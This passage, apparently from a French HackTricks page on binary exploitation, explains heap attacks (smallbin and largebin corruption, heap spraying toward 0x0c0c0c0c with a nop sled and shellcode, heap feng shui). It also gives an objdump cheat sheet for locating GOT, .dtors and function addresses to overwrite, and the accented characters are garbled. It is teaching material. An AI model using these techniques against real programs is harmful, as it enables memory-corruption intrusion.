Pour que la vuln√©rabilit√© soit exploit√©e le plus rapidement possible, l'id√©al serait : r√©servation du morceau vuln√©rable, r√©servation du morceau √† modifier, lib√©ration de ce morceau, r√©servation d'un morceau plus grand que celui √† modifier, modification du morceau (vuln√©rabilit√©), r√©servation d'un morceau de m√™me taille que celui viol√© et r√©servation d'un deuxi√®me morceau de m√™me taille qui pointera vers l'adresse choisie.

Pour prot√©ger cette attaque, la v√©rification typique selon laquelle le morceau "n'est pas" faux est utilis√©e : on v√©rifie si bck->fd pointe vers victim. Autrement dit, dans notre cas, si le pointeur fd\* du morceau faux point√© dans le stack pointe vers victim. Pour contourner cette protection, l'attaquant devrait √™tre capable d'√©crire d'une mani√®re ou d'une autre (probablement via le stack) √† l'adresse appropri√©e l'adresse de victim. Ainsi, cela ressemblera √† un morceau r√©el.

**Corruption LargeBin**

Les m√™mes exigences que pr√©c√©demment sont n√©cessaires, ainsi que quelques autres, en plus les morceaux r√©serv√©s doivent √™tre sup√©rieurs √† 512.

L'attaque est similaire √† la pr√©c√©dente, c'est-√†-dire qu'il faut modifier le pointeur bk et toutes ces appels √† malloc(), mais il faut √©galement modifier la taille du morceau modifi√© de telle sorte que cette taille - nb soit < MINSIZE.

Par exemple, il faudra mettre la taille √† 1552 pour que 1552 - 1544 = 8 < MINSIZE (la soustraction ne peut pas √™tre n√©gative car elle compare un unsigned)

De plus, un correctif a √©t√© introduit pour rendre les choses encore plus compliqu√©es.

**Heap Spraying**

Il s'agit essentiellement de r√©server autant de m√©moire que possible pour les tas et de les remplir avec un matelas de nops suivi d'un shellcode. De plus, 0x0c est utilis√© comme matelas. On essaiera donc de sauter √† l'adresse 0x0c0c0c0c, et ainsi, si une adresse √† laquelle on va appeler est √©cras√©e avec ce matelas, on sautera l√†-bas. Fondamentalement, la tactique consiste √† r√©server autant que possible pour voir si un pointeur est √©cras√© et √† sauter √† 0x0c0c0c0c en esp√©rant qu'il y ait des nops l√†-bas.

**Heap Feng Shui**

Il consiste √† cimenter la m√©moire en r√©servant et en lib√©rant des morceaux de mani√®re √† ce qu'il reste des morceaux r√©serv√©s entre des morceaux libres. Le tampon √† d√©border sera plac√© dans l'un de ces morceaux.

**objdump -d executable** ‚Äî> D√©sassembler les fonctions\
**objdump -d ./PROGRAMA | grep FUNCTION** ‚Äî> Obtenir l'adresse de la fonction\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et obtenir les opcodes\
**objdump -t ./exec | grep varBss** ‚Äî> Table des symboles, pour obtenir l'adresse des variables et fonctions\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Pour obtenir l'adresse des fonctions de biblioth√®que (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtient l'adresse de puts √† √©craser dans le GOT\
**objdump -D ./exec** ‚Äî> D√©sassembler TOUT jusqu'aux entr√©es de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info de la fonction en gdb

## Cours int√©ressants

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **R√©f√©rences**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
